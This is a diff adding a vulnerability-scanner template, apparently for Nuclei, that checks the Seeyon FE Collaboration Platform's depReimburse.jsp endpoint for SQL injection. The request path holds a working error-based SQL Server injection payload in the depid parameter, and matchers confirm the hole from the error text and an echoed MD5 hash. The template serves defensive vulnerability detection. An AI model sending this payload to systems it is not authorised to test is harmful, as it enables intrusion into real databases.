@@ -1,0 +1,31 @@
+id: poc-yaml-seeyon-hulian-fe-depreimburse-sqli
+info:
+  name: Seeyon FE Collaboration Platform depReimburse SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sqli
+  description: |
+    SQL Injection vulnerability in Seeyon FE Collaboration Platform's depReimburse.jsp endpoint.
+
+variables:
+  t1: "{{rand_int(1000, 10000)}}"
+  t2: "{{md5(t1)}}"
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/witapprovemanage/report/depReimburse.jsp?depid=1+AND+8218+IN+(SELECT+(sys.fn_varbintohexstr(hashbytes('MD5','{{t1}}'))))"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        part: body
+        words:
+          - "SQLServerException:"
+          - "转换成数据类型"
+      - type: word
+        part: body
+        words:
+          - "0x{{t2}}"
